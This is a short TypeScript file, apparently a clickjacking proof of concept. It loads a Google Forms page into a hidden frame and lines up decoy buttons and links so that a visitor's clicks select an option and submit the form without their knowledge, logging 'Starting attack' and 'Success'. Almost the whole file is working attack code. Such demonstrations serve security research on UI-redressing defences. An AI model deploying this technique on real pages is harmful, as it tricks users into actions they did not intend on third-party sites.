import { Frame } from './frame/index.ts'
import { sleep } from './utils.ts'

const runButton = document.getElementById('run') as HTMLButtonElement
const outputElement = document.getElementById('output') as HTMLElement

const decoyButton = document.getElementById('decoy-button') as HTMLButtonElement
const decoyLink = document.getElementById('decoy-link') as HTMLAnchorElement
const decoyElements = [decoyButton, decoyLink]

async function main() {
  runButton.disabled = true
  outputElement.innerText = ''
  const log = (msg: string) => {
    outputElement.innerText += msg + '\n'
    console.log(msg)
  }

  log('Starting attack')

  using frame = new Frame(1000, 1000)
  await frame.load('https://forms.gle/ZEBK8v684ARcuh1o9')
  log('Frame loaded')

  await frame.elementClick(decoyButton, { x: 215, y: 320 })
  log('Clicked option')
  await frame.elementClick(decoyElements, { x: 226, y: 397 })
  log('Clicked submit')

  await sleep(1000) // Wait for the form to submit

  log('Success')
  runButton.disabled = false

  const iframe = frame.retriveFrame()
  iframe.style = ''
}

runButton.addEventListener('click', main)
